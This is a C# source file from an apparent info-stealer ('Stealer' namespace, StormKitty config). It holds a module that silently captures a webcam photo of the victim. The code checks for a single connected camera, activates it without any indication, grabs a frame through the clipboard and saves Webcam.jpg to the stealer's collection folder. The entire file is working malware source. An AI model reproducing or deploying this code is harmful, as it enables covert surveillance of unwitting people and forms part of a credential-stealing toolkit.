using System;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

namespace Stealer
{
    internal sealed class WebcamScreenshot
    {
		[DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
		[DllImport("user32", EntryPoint = "SendMessage")]
		public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

		private static IntPtr Handle;
		private static int delay = 3000;


		// Get connected cameras count
		private static int GetConnectedCamerasCount()
		{
			int cameras = 0;
			try
			{
				using (var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
					foreach (var device in searcher.Get())
						cameras++;
			} catch { Console.WriteLine("GetConnectedCamerasCount : Query failed"); }
			
			
			return cameras;
		}

		// Create screenshot for password stealer
		public static bool Make(string sSavePath)
		{
			// If webcam disabled => skip
			if (StormKitty.Config.WebcamScreenshot != "1")
				return false;

			// If connected one camera
			if (GetConnectedCamerasCount() != 1)
				return false;
			try
			{
				Clipboard.Clear();
				Handle = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);
				// Initialize webcamera
				SendMessage(Handle, 1034, 0, 0);
				SendMessage(Handle, 1074, 0, 0);
				// Delay
				System.Threading.Thread.Sleep(delay);
				// Capture frame
				SendMessage(Handle, 1084, 0, 0);
				SendMessage(Handle, 1054, 0, 0);
				// Stop webcamera
				SendMessage(Handle, 1035, 0, 0);
				// Save
				Image image = (Image)Clipboard.GetDataObject()
					.GetData(DataFormats.Bitmap);
				Clipboard.Clear();
				image.Save(sSavePath + "\\Webcam.jpg", ImageFormat.Jpeg);
				image.Dispose();
				Counter.WebcamScreenshot = true;
			}
			catch (Exception ex) {
				Console.WriteLine(ex);
				return false;
			};

			return true;
		}


	}
}
